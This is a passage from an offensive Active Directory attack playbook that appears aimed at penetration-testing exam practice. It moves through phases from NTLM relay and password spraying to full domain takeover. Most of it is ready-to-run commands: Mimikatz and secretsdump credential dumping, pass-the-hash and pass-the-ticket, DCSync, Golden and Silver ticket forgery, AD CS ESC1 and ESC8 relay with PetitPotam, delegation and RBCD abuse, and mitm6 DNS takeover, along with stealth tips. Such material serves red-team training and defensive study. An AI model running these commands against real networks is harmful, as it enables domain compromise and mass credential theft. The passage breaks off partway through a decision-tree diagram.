> *Operational Mechanism: Act as an active Man-in-the-Middle by intercepting NetNTLM authentication handshakes and forwarding them in real-time to external targets where SMB Signing is disabled.*

```text
┌──────────────┐             ┌────────────────┐             ┌────────────────────┐
│ Victim Host  │ ──(1) Auth──>│  ntlmrelayx    │ ──(2) Auth──>│ Target Server      │
│ (Coerced)    │ <─(4) Chall─ │  (Attacker)    │ <─(3) Chall─ │ (SMB / LDAP / HTTP)│
│              │ ──(5) Resp──>│                │ ──(6) Resp──>│                    │
│              │             │                │              │ Access Granted!    │
└──────────────┘             └────────────────┘             └────────────────────┘
```

### Operational Requirements:
- **SMB Signing Disabled**: The target machine must not require SMB message signing.
- **Cross-Host Authentication**: A host cannot relay authentication back to itself over SMB (reflected relay mitigation). Relaying must proceed from Host A to Host B.

### Step-by-Step Execution:

```bash
# 1. Identify network hosts with SMB Signing disabled
nxc smb targets.txt --gen-relay-list unsigned_smb_targets.txt

# 2. Disable SMB and HTTP listeners in /etc/responder/Responder.conf to prevent port conflicts:
# [Responder.conf]
# SMB = Off
# HTTP = Off

# 3. Start ntlmrelayx pointing to identified targets
impacket-ntlmrelayx -tf unsigned_smb_targets.txt -smb2support -socks

# Useful execution flags:
#   -c 'powershell -e [BASE64_PAYLOAD]' -> Execute administrative commands
#   -e shell.exe                        -> Deploy and execute payload binary
#   -socks                              -> Maintain authenticated SOCKS proxy sessions
#   --delegate-access                   -> Configure RBCD for persistent domain takeover
#   -t ldap://[DC_IP]                   -> Relay to LDAP to modify directory objects

# 4. Start Responder to poison broadcast protocols
sudo responder -I tun0

# 5. Coerce authentication from the victim machine using UNC injection, PetitPotam, or PrinterBug
```

> ⚠️ **Relaying to LDAP and AD CS:**
> When relaying authentication to LDAP or LDAPS, attackers can create computer accounts, configure RBCD delegation, or modify group memberships. Relaying domain controller machine accounts to AD CS HTTP enrollment endpoints provides immediate Domain Administrator takeover (see Phase 8).

---

# Phase 4: Lateral Movement and Credential Access

## 4.1: Domain Password Spraying

> *Spray validated password candidates across all discovered domain user accounts, strictly adhering to account lockout thresholds.*

```powershell
# 1. Review Domain Account Lockout Policy
net accounts /domain
```
- Observe `Lockout threshold`, `Lockout duration`, and `Lockout observation window`. Never exceed `Threshold - 2` attempts per window.

```bash
# 2. Execute password spraying across discovered targets
# Spray via SMB
nxc smb [DC_IP] -u users.txt -p 'Spring2026!' -d corp.local --continue-on-success

# Spray via WinRM (Port 5985)
nxc winrm targets.txt -u users.txt -p 'Spring2026!' -d corp.local --continue-on-success

# Spray via RDP (Port 3389)
nxc rdp targets.txt -u users.txt -p 'Spring2026!' -d corp.local --continue-on-success
```

---

## 4.2: Pass-The-Hash (PtH)

> *Authenticate directly across remote network services using raw NTLM password hashes without requiring cleartext credentials.*

Possession of an NTLM hash allows computing valid challenge responses directly. Pass-the-Hash succeeds whenever NTLM authentication is accepted by the remote endpoint.

```bash
# 1. Interactive PowerShell access via Evil-WinRM (Port 5985)
evil-winrm -i [TARGET_IP] -u [USERNAME] -H [NTLM_HASH]

# 2. Remote command execution via Impacket PsExec (SMB service creation - SYSTEM privileges)
impacket-psexec corp.local/[USERNAME]@[TARGET_IP] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]

# 3. Stealth execution via Impacket WMIExec (DCOM / WMI - process spawning)
impacket-wmiexec corp.local/[USERNAME]@[TARGET_IP] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]

# 4. Remote execution via Impacket SMBExec (Service-less SMB execution)
impacket-smbexec corp.local/[USERNAME]@[TARGET_IP] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]

# 5. Validate administrative access across hosts with NetExec
nxc smb targets.txt -u [USERNAME] -H [NTLM_HASH] -d corp.local
nxc winrm targets.txt -u [USERNAME] -H [NTLM_HASH] -d corp.local
```

---

## 4.3: Pass-The-Ticket (PtT)

> *Extract Kerberos TGT and TGS tickets from LSASS memory on a compromised machine and inject them into the current session to authenticate without credentials.*

Pass-the-Ticket is essential when NTLM is disabled across the network or when target services require Kerberos delegation.

### Pass-the-Ticket via Mimikatz (Windows)
```powershell
# 1. Enumerate active Kerberos tickets in memory
mimikatz # sekurlsa::tickets

# 2. Export all memory tickets to disk (.kirbi files)
mimikatz # sekurlsa::tickets /export

# 3. Inject the exported ticket into the current logon session
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-admin@krbtgt-CORP.LOCAL.kirbi

# 4. Verify the injected ticket in the current session
klist
```

### Pass-the-Ticket via Rubeus (Windows)
```powershell
# 1. Triage active logon sessions and tickets
.\Rubeus.exe triage

# 2. Dump all tickets in base64 format
.\Rubeus.exe dump /nowrap

# 3. Dump a specific session ticket by Logon Unique Identifier (LUID)
.\Rubeus.exe dump /luid:0x12bd0 /nowrap

# 4. Inject base64 ticket directly into current session
.\Rubeus.exe ptt /ticket:[BASE64_TICKET_STRING]

# 5. Spawn a sacrificial process containing the injected ticket (avoids session contamination)
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:[TARGET_USER] /password:dummy /ticket:[BASE64_TICKET_STRING]
```

### Pass-the-Ticket on Linux (.kirbi to .ccache Conversion)
```bash
# 1. Convert Windows Mimikatz .kirbi ticket to Linux Impacket .ccache format
impacket-ticketConverter ticket.kirbi ticket.ccache

# 2. Export Kerberos credential cache environment variable
export KRB5CCNAME=ticket.ccache

# 3. Execute authenticated Impacket operations using Kerberos (-k flag)
impacket-psexec -k -no-pass corp.local/[USERNAME]@target.corp.local
impacket-secretsdump -k -no-pass corp.local/[USERNAME]@dc01.corp.local
```

---

## 4.4: Credential Dumping on Compromised Workstations

```bash
# Dump SAM, LSA secrets, and domain cache remotely via Impacket
impacket-secretsdump corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]
```

```powershell
# Local memory extraction using Mimikatz
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # Cleartext credentials and NTLM hashes
mimikatz # lsadump::sam                # Local SAM database hashes
mimikatz # lsadump::secrets            # LSA secrets (cached service passwords)
```

### Switching User Context Post-Credential Recovery
```cmd
# Execute shell under targeted domain user context
runas /user:corp.local\[TARGET_USER] powershell
```

### Accessing Administrative Network Shares
```powershell
# Access administrative C$ share using established credentials
Get-ChildItem -Path \\[TARGET_HOST]\C$\Users\Administrator\Desktop
Get-Content -Path \\[TARGET_HOST]\C$\Users\Administrator\Desktop\proof.txt
```

---

# Phase 5: DACL and Object Access Control (ACL) Abuse

> *Exploiting misconfigured Access Control Entries (ACEs) identified during BloodHound analysis to escalate privileges and alter domain objects.*
> *Load PowerView in an elevated PowerShell session: `powershell -ep bypass` then `. .\PowerView.ps1`*

### Vector 1: `GenericAll` on User Object -> Password Reset
```powershell
# Reset targeted user password via native command or PowerView
net user [TARGET_USER] 'P@ssw0rd123!' /domain
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
```

### Vector 2: `GenericAll` on Group Object -> Add Account to Group
```powershell
net group "Domain Admins" [MY_USER] /add /domain
Add-DomainGroupMember -Identity "Domain Admins" -Members "[MY_USER]" -Verbose
```

### Vector 3: `GenericWrite` -> Targeted Kerberoasting via SPN Injection
```powershell
# Inject arbitrary SPN into target user object
Set-DomainObject -Identity [TARGET_USER] -Set @{serviceprincipalname='fake/service'} -Verbose

# Request Kerberos ticket from Kali
# impacket-GetUserSPNs corp.local/[MY_USER]:'[PASSWORD]' -dc-ip [DC_IP] -request

# Remove injected SPN post-exploitation
Set-DomainObject -Identity [TARGET_USER] -Clear serviceprincipalname -Verbose
```

### Vector 4: `WriteDacl` -> Assign Self `GenericAll` Permissions
```powershell
Add-DomainObjectAcl -TargetIdentity [TARGET_USER] -PrincipalIdentity [MY_USER] -Rights All -Verbose
```

### Vector 5: `WriteOwner` -> Ownership Hijacking
```powershell
Set-DomainObjectOwner -Identity [TARGET_USER] -OwnerIdentity [MY_USER] -Verbose
Add-DomainObjectAcl -TargetIdentity [TARGET_USER] -PrincipalIdentity [MY_USER] -Rights All -Verbose
```

### Vector 6: `ForceChangePassword` -> Direct Administrative Reset
```powershell
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
```

### Vector 7: LAPS Password Retrieval (`ms-Mcs-AdmPwd`)
```bash
# Query LAPS passwords remotely using NetExec
nxc ldap [DC_IP] -u [USERNAME] -p '[PASSWORD]' --laps
```
```powershell
# Query LAPS passwords via PowerView
Get-DomainComputer -Identity [TARGET_COMPUTER] -Properties ms-mcs-AdmPwd
```

---

# Phase 6: Overpass-the-Hash and Pass-the-Key

> *Operational Context: Convert an acquired NTLM hash or AES key into a fully valid Kerberos Ticket Granting Ticket (TGT) to interact with Kerberos-enforced services.*

### When to Select Overpass-the-Hash vs Pass-the-Hash:
- **Pass-the-Hash (NTLM)**: Optimal when accessing endpoints via raw IP address and when SMB/WinRM accept NTLM authentication.
- **Overpass-the-Hash (Kerberos)**: Required when NTLM authentication is disabled, when target services enforce Kerberos delegation, or when communicating strictly via DNS hostnames.

### Execution from Kali Linux (Impacket)
```bash
# 1. Request Kerberos TGT using NTLM hash
impacket-getTGT corp.local/[USERNAME] -hashes :[NTLM_HASH] -dc-ip [DC_IP]

# 2. Export credential cache variable
export KRB5CCNAME=[USERNAME].ccache

# 3. Execute administrative operations using Kerberos authentication
impacket-psexec -k -no-pass corp.local/[USERNAME]@target.corp.local
impacket-wmiexec -k -no-pass corp.local/[USERNAME]@target.corp.local
impacket-secretsdump -k -no-pass corp.local/[USERNAME]@dc01.corp.local
```

### Execution from Windows (Mimikatz and Rubeus)
```powershell
# Mimikatz: Inject NTLM hash into a new PowerShell process context
mimikatz # sekurlsa::pth /user:[USERNAME] /domain:corp.local /ntlm:[NTLM_HASH] /run:powershell
# Note: whoami displays the local user, but all network requests transparently present the Kerberos ticket.

# Rubeus: Request TGT and inject into current session
.\Rubeus.exe asktgt /user:[USERNAME] /rc4:[NTLM_HASH] /ptt
klist
Get-ChildItem -Path \\[TARGET_HOST]\C$
```

---

# Phase 7: Domain Takeover and Persistence

## 7.1: DCSync Attack (Directory Replication Service Remote - MS-DRSR)

> *Target Profile: An account holding directory replication privileges or membership in Domain Admins, Enterprise Admins, or Administrators.*

### Protocol Mechanism:
In a multi-DC environment, Domain Controllers synchronize directory data using the **Directory Replication Service Remote (MS-DRSR)** protocol via RPC (`DRSUAPI`). When a DC requests replication, it executes a `DRSGetNCChanges` RPC call, prompting the partner DC to return the requested directory objects, including encrypted password hashes (`unicodePwd`, `ntlmHash`, `supplementalCredentials`).

The DCSync attack simulates a legitimate Domain Controller executing this replication request. An attacker holding replication rights retrieves the password hashes for any domain user without executing code on the DC or touching the physical `NTDS.dit` file on disk.

### Required Privileges:
Possession of either of the following extended access rights granted on the root domain object:
- `DS-Replication-Get-Changes` (Replicating Directory Changes)
- `DS-Replication-Get-Changes-All` (Replicating Directory Changes All)

```bash
# 1. Dump all domain user hashes remotely using Impacket
impacket-secretsdump corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP]

# 2. Execute DCSync using Pass-the-Hash
impacket-secretsdump corp.local/[USERNAME]@[DC_IP] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]

# 3. Dump only specific high-value accounts (avoids generating excessive directory noise)
impacket-secretsdump corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP] -just-dc-user Administrator
impacket-secretsdump corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP] -just-dc-user krbtgt
```

```powershell
# Execute DCSync locally from Windows using Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

> 💡 **Auditing DCSync Rights via PowerView:**
> ```powershell
> Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Replication"}
> ```

---

## 7.2: Golden Ticket (Domain-Wide Ticket Granting Ticket Forgery)

> *Operational Context: Post-exploitation domain persistence following acquisition of the `krbtgt` account NTLM hash and Domain SID.*

### Protocol Mechanism:
The Kerberos KDC encrypts and signs all issued Ticket Granting Tickets (`TGT`) with the secret password hash of the `krbtgt` account. When a client presents a TGT to request a service ticket, the KDC decrypts the TGT using its `krbtgt` key to verify authenticity. The KDC assumes that any ticket successfully decrypting with this key was issued by itself.

Possession of the `krbtgt` hash allows an attacker to arbitrarily forge valid TGT tickets specifying:
- Any active domain username.
- Full administrative group memberships (Domain Admins `512`, Domain Users `513`, Schema Admins `518`, Enterprise Admins `519`, Group Policy Creator Owners `520`).
- Custom ticket lifetimes (up to 10 years).

> ⚠️ **Critical Rules for Golden Ticket Usage:**
> - **Enforce Hostname Resolution**: Always target hosts via DNS hostnames (`\\dc01.corp.local`), never raw IPs.
> - **Enforce Valid Usernames**: Modern PAC validation enforces that the `/user:` argument specifies a real, existing domain account.

```powershell
# 1. Extract krbtgt hash and Domain SID from the DC
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

# 2. Forge and inject Golden Ticket into current session
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3842939050-3880345419-1844481999 /krbtgt:[KRBTGT_HASH] /ptt
mimikatz # misc::cmd

# 3. Access Domain Controller administrative shares
dir \\dc01.corp.local\C$
PsExec.exe \\dc01.corp.local cmd.exe
```

```bash
# Forge Golden Ticket on Linux using Impacket
impacket-ticketer -domain corp.local -domain-sid S-1-5-21-3842939050-3880345419-1844481999 -nthash [KRBTGT_HASH] -groups 512,513,518,519,520 Administrator

# Export credential cache and access DC
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
```

---

## 7.3: Silver Ticket (Targeted Service Ticket Forgery)

> *Operational Context: Forge a valid Ticket Granting Service (`TGS`) ticket for a specific service using that service account's password hash.*

### Golden Ticket vs Silver Ticket Comparison:

| Characteristic | Golden Ticket | Silver Ticket |
| :--- | :--- | :--- |
| **Forged Artifact** | Ticket Granting Ticket (TGT) | Ticket Granting Service (TGS) |
| **Cryptographic Key** | `krbtgt` account password hash | Specific service account password hash |
| **Access Scope** | Complete domain infrastructure | Specific service on a specific host |
| **KDC Interaction** | Interacts with KDC to request TGS tickets | **Zero KDC interaction** (presented directly to service) |
| **Detection Profile** | Audited in KDC TGS request event logs | **Completely stealthy** (no event logs on DC) |
| **Prerequisites** | Domain Controller compromise | Single service account compromise |

```powershell
# Forge Silver Ticket for SMB File Sharing (CIFS)
mimikatz # kerberos::golden /sid:S-1-5-21-... /domain:corp.local /target:web01.corp.local /service:cifs /rc4:[SERVICE_HASH] /user:Administrator /ptt
Get-ChildItem -Path \\web01.corp.local\C$

# Forge Silver Ticket for HTTP (IIS Web Applications)
mimikatz # kerberos::golden /sid:S-1-5-21-... /domain:corp.local /target:web01.corp.local /service:http /rc4:[SERVICE_HASH] /user:Administrator /ptt
Invoke-WebRequest -UseDefaultCredentials -Uri http://web01.corp.local

# Forge Silver Ticket for Microsoft SQL Server (MSSQL)
mimikatz # kerberos::golden /sid:S-1-5-21-... /domain:corp.local /target:db01.corp.local /service:MSSQLSvc /rc4:[SERVICE_HASH] /user:Administrator /ptt
```

```bash
# Forge Silver Ticket on Linux using Impacket
impacket-ticketer -domain corp.local -domain-sid S-1-5-21-... -nthash [SERVICE_HASH] -spn CIFS/web01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@web01.corp.local
```

### High-Value Services for Silver Ticket Forgery:

| Target Service | Service Principal Name (SPN) | Operational Access Granted |
| :--- | :--- | :--- |
| **CIFS** | `cifs/hostname.corp.local` | Full SMB administrative access (`C$`, `ADMIN$`) |
| **HTTP** | `http/hostname.corp.local` | Authenticated access to enterprise IIS web applications |
| **HOST** | `host/hostname.corp.local` | WMI, scheduled tasks, and remote service control |
| **MSSQL** | `MSSQLSvc/hostname.corp.local:1433` | Administrative database querying and `xp_cmdshell` execution |
| **LDAP** | `ldap/hostname.corp.local` | Directory querying and DCSync execution (if targeting the DC) |

---

## 7.4: Final Domain Controller Compromise and Proof Retrieval

```bash
# 1. Establish administrative shell on the Domain Controller
evil-winrm -i [DC_IP] -u Administrator -H [NTLM_HASH]
impacket-psexec corp.local/Administrator@[DC_IP] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]
impacket-wmiexec -hashes :[NTLM_HASH] Administrator@[DC_IP]

# 2. Extract proof flags across all compromised systems
type C:\Users\Administrator\Desktop\proof.txt
```

---

# Phase 8: Active Directory Certificate Services (AD CS)

> *Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) capabilities for domain environments. Internal certificates serve as cryptographic credentials for Kerberos authentication via PKINIT. Acquiring an administrative certificate provides persistent, non-revocable domain access.*

## 8.1: ESC1 - Misconfigured Certificate Template Exploitation

### Four Prerequisites for ESC1 Vulnerability:
1. **Low-Privilege Enrollment Rights**: Granted to `Domain Users` or `Authenticated Users`.
2. **`ENROLLEE_SUPPLIES_SUBJECT` Flag Enabled**: Allows the applicant to specify an arbitrary Subject Alternative Name (SAN).
3. **Client Authentication EKU Present**: Specifies `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, or `Any Purpose`.
4. **No Manager Approval Required**: `Manager Approval` is disabled.

### Automated Vulnerability Enumeration with Certipy
```bash
# 1. Scan the domain for all vulnerable certificate templates
certipy find -u [USERNAME]@corp.local -p '[PASSWORD]' -dc-ip [DC_IP] -vulnerable -stdout

# 2. Save complete enumeration results in JSON format
certipy find -u [USERNAME]@corp.local -p '[PASSWORD]' -dc-ip [DC_IP] -vulnerable -json
```

### Exploiting ESC1 via Certipy (Linux)
```bash
# 1. Request certificate specifying Domain Administrator as the Subject Alternative Name (UPN)
certipy req -u [USERNAME]@corp.local -p '[PASSWORD]' -dc-ip [DC_IP] \
  -ca '[CA_NAME]' -template '[VULNERABLE_TEMPLATE]' \
  -upn Administrator@corp.local

# 2. Authenticate using the generated PFX certificate to retrieve the Administrator TGT and NT hash
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]

# 3. Utilize recovered NT hash for DCSync or Pass-the-Hash
impacket-secretsdump corp.local/Administrator@[DC_IP] -hashes :[RECOVERED_NT_HASH]
```

### Exploiting ESC1 from Windows (Certify and Rubeus)
```powershell
# 1. Audit vulnerable templates
.\Certify.exe find /vulnerable

# 2. Request certificate specifying Administrator SAN
.\Certify.exe request /ca:DC01.corp.local\[CA_NAME] /template:[VULNERABLE_TEMPLATE] /altname:Administrator

# 3. Convert PEM output to PFX format
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx

# 4. Request Kerberos TGT using the certificate via Rubeus
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
klist
```

---

## 8.2: Coerced Authentication and NTLM Relay to AD CS (ESC8)

> *Attack Chain: Coerce the Domain Controller machine account (`DC01$`) to authenticate against the attacker machine via MS-EFSRPC (PetitPotam) or MS-RPRN (PrinterBug). Relay the incoming NTLM authentication to the AD CS HTTP Web Enrollment endpoint (`/certsrv`) to obtain a machine certificate for the DC, enabling immediate DCSync.*

```bash
# 1. Start ntlmrelayx targeting the AD CS HTTP Web Enrollment endpoint
impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# 2. Coerce authentication from the Domain Controller using PetitPotam
python3 PetitPotam.py [KALI_IP] [DC_IP]
# If patched against anonymous RPC, supply authenticated credentials:
python3 PetitPotam.py -u [USERNAME] -p '[PASSWORD]' -d corp.local [KALI_IP] [DC_IP]

# 3. Retrieve base64-encoded certificate for DC01$ emitted by ntlmrelayx

# 4. Authenticate using the DC certificate to recover the DC01$ machine account NT hash
certipy auth -pfx dc01.pfx -dc-ip [DC_IP]

# 5. Execute DCSync using the machine account hash
impacket-secretsdump corp.local/DC01\$@[DC_IP] -hashes :[DC_NT_HASH]
```

> 💡 **Authentication Coercion Alternatives:**
> ```bash
> # Coercer (automates testing across MS-EFSRPC, MS-RPRN, MS-DFSNM)
> python3 Coercer.py -u [USERNAME] -p '[PASSWORD]' -d corp.local -l [KALI_IP] -t [DC_IP]
>
> # PrinterBug (MS-RPRN Print Spooler)
> python3 printerbug.py corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP] [KALI_IP]
> ```

---

# Phase 9: Kerberos Delegation Attacks

> *Kerberos delegation permits a service to impersonate a connecting user when requesting resources from secondary backend services. Misconfigurations in delegation permit unauthorized impersonation of privileged domain administrators.*

## 9.1: Unconstrained Delegation

### Protocol Mechanism:
When a host is configured with Unconstrained Delegation (`TRUSTED_FOR_DELEGATION` in `userAccountControl`):
1. A connecting user requests a forwardable `TGS` ticket for that host.
2. The KDC encapsulates the user's **complete Ticket Granting Ticket (TGT)** inside the `TGS` ticket.
3. The server extracts and **caches the user's full TGT in LSASS memory**.
4. The server can now impersonate that user across any domain service.

Compromising an unconstrained delegation host allows harvesting the TGT of any user who authenticates to it. Coercing a Domain Controller to authenticate instantly yields a `DC01$` machine TGT capable of DCSync.

### Detection:
```bash
# Query unconstrained delegation computers via LDAP
ldapsearch -x -H ldap://[DC_IP] -D "[USERNAME]@corp.local" -w '[PASSWORD]' \
  -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```
```powershell
# Query unconstrained delegation computers via PowerView
Get-DomainComputer -Unconstrained | Select-Object samaccountname, dnshostname
```

### Exploitation:
```powershell
# 1. On the compromised unconstrained host, monitor LSASS for incoming tickets
.\Rubeus.exe monitor /interval:5 /nowrap

# 2. From Kali, coerce the Domain Controller to authenticate against the unconstrained host
python3 printerbug.py corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP] [UNCONSTRAINED_SERVER_IP]

# 3. Rubeus captures the DC01$ TGT from LSASS memory. Inject the captured ticket:
.\Rubeus.exe ptt /ticket:[BASE64_DC_TGT]

# 4. Execute DCSync with the injected machine ticket
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\Administrator
```

```bash
# From Linux (if ticket was extracted and converted to .ccache)
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/DC01\$@dc01.corp.local
```

---

## 9.2: Constrained Delegation (S4U2Self and S4U2Proxy)

### Protocol Mechanism:
Constrained Delegation restricts target delegation to specific services enumerated in `msDS-AllowedToDelegateTo` via two Kerberos extensions:
1. **S4U2Self (Service for User to Self)**: The service requests a valid service ticket for itself on behalf of an arbitrary user (e.g., Domain Administrator) without requiring that user to authenticate.
2. **S4U2Proxy (Service for User to Proxy)**: The service presents that ticket to the KDC to request a new service ticket for the target host listed in `msDS-AllowedToDelegateTo`, impersonating the chosen user.

Compromise of an account configured with Constrained Delegation allows forging administrative service tickets for any service listed in `msDS-AllowedToDelegateTo`.

### Detection:
```powershell
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
```

### Exploitation via Impacket (Linux):
```bash
# Execute S4U2Self and S4U2Proxy using account password
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator \
  corp.local/svc-web:'[PASSWORD]' -dc-ip [DC_IP]

# Execute using NTLM password hash
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator \
  corp.local/svc-web -hashes :[NTLM_HASH] -dc-ip [DC_IP]

# Export generated ticket and access target host
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@target.corp.local
```

### Exploitation via Rubeus (Windows):
```powershell
.\Rubeus.exe s4u /user:svc-web /rc4:[NTLM_HASH] /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
klist
Get-ChildItem -Path \\target.corp.local\C$
```

> 💡 **SPN Name Swapping Technique:**
> The KDC verifies the destination hostname but does not validate the service class. If `msDS-AllowedToDelegateTo` lists `cifs/target.corp.local`, attackers can request tickets for `ldap/target.corp.local`, `http/target.corp.local`, or `host/target.corp.local`. If the target is the Domain Controller, requesting `ldap/` grants DCSync execution.

---

## 9.3: Resource-Based Constrained Delegation (RBCD)

### Protocol Mechanism:
Unlike classical Constrained Delegation where permissions are configured on the source service, Resource-Based Constrained Delegation (RBCD) is controlled by the **destination resource**.
The destination computer object defines which accounts can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

Any user possessing write permissions over a target computer object (`GenericAll`, `GenericWrite`, `WriteProperty`) can configure RBCD to allow an attacker-controlled computer account to delegate to it, achieving full administrative compromise.

### Prerequisites:
1. Write access over `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object.
2. An attacker-controlled machine account (standard domain users can create up to 10 machine accounts by default via `ms-DS-MachineAccountQuota`).

### Exploitation Workflow (Linux):
```bash
# 1. Create a new machine account in the domain
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ssw0rd123!' \
  -dc-ip [DC_IP] corp.local/[USERNAME]:'[PASSWORD]'

# 2. Configure RBCD: Grant EVIL$ permission to delegate to TARGET$
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  -dc-ip [DC_IP] corp.local/[USERNAME]:'[PASSWORD]'

# 3. Request service ticket impersonating Administrator via S4U
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator \
  corp.local/'EVIL$':'P@ssw0rd123!' -dc-ip [DC_IP]

# 4. Access target host with the administrative ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@target.corp.local
```

### Exploitation Workflow (Windows):
```powershell
# 1. Create machine account
New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)

# 2. Construct security descriptor granting EVIL$ delegation rights
$evilSid = Get-DomainComputer EVIL -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# 3. Write descriptor to target computer attribute
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 4. Execute S4U delegation via Rubeus
.\Rubeus.exe hash /password:P@ssw0rd123! /user:EVIL$ /domain:corp.local
.\Rubeus.exe s4u /user:EVIL$ /rc4:[EVIL_HASH] /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
klist
Get-ChildItem -Path \\target.corp.local\C$
```

---

# Phase 10: IPv6 DNS Takeover and Relay (mitm6)

> *Operational Context: Windows systems enable IPv6 by default and prioritize IPv6 DNS resolution over IPv4 (RFC 6724). When no legitimate DHCPv6 server exists on the local network, an attacker can operate a rogue DHCPv6 server to assign IPv6 DNS addresses, capturing and relaying NetNTLM authentication.*

```text
1. mitm6 answers Windows DHCPv6 Solicit queries -> Designates attacker machine as primary DNS.
2. Windows host queries attacker DNS for internal services or Web Proxy Auto-Discovery (WPAD).
3. mitm6 resolves queries to the attacker IP, prompting Windows to initiate NTLM authentication.
4. ntlmrelayx intercepts authentication and relays it to LDAP (for RBCD persistence) or AD CS (for certificates).
```

### Attack Execution:
```bash
# Terminal 1: Start ntlmrelayx relaying to Domain Controller LDAPS
# Option --delegate-access automatically creates a machine account and configures RBCD
impacket-ntlmrelayx -6 -t ldaps://[DC_IP] -wh fakewpad.corp.local --delegate-access -l loot

# Terminal 2: Start mitm6 listening for IPv6 DHCP requests
sudo mitm6 -d corp.local -i eth0
```

```bash
# Alternative: Relay to AD CS HTTP Web Enrollment endpoint
impacket-ntlmrelayx -6 -t http://[CA_IP]/certsrv/certfnsh.asp -wh fakewpad.corp.local \
  --adcs --template Machine -smb2support

sudo mitm6 -d corp.local -i eth0
# Authenticate using received machine certificate via certipy auth to retrieve the machine NT hash.
```

> ⚠️ **Operational Warning on Network Noise:**
> `mitm6` broadcasts across the entire local subnet, capturing traffic from all active workstations. Limit execution duration and terminate the tool immediately once authentication is captured.

---

# Phase 11: Comprehensive Active Directory Attack Flow and Decision Tree

```text
                          ACTIVE DIRECTORY DECISION TREE
                          ==============================

                              [ INITIAL RECONNAISSANCE ]
                                          |
                        +-----------------+-----------------+
                        |                                   |
                [ Port 88 / 389 Present? ]          [ Web / Custom Services ]
                        |                                   |
                +-------+-------+                           v
                |               |                 Exploit Web App / Service
                v               v                           |
         DOMAIN CONTROLLER    CLIENT HOST                   v
         - DNS (53)           - HTTP (80/443)       Low-Privilege Shell
         - Kerberos (88)      - SMB (445)                   |
         - LDAP (389)         - MSSQL (1433)                +---------+
         - LDAPS (636)        - RDP (3389)                            |
                                                                      v
                                                           [ Local Enumeration ]
                                                           whoami /priv, net accounts
                                                                      |
                     +------------------------------------------------+
                     |
                     v
          [ UNCREDENTIALED ATTACKS ]
                     |
         +-----------+-----------+
         |                       |
         v                       v
    SMB Null Session        Kerbrute Userenum
    nxc smb --shares        Valid user list acquired
         |                       |
         v                       v
    SYSVOL / Shares         AS-REP Roasting
    GPP Passwords?          GetNPUsers.py -> Hashcat 18200
         |                       |
         +-----------+-----------+
                     |
                     v
         [ CREDENTIAL ACQUIRED ] (User:Password or User:NTLM)
                     |
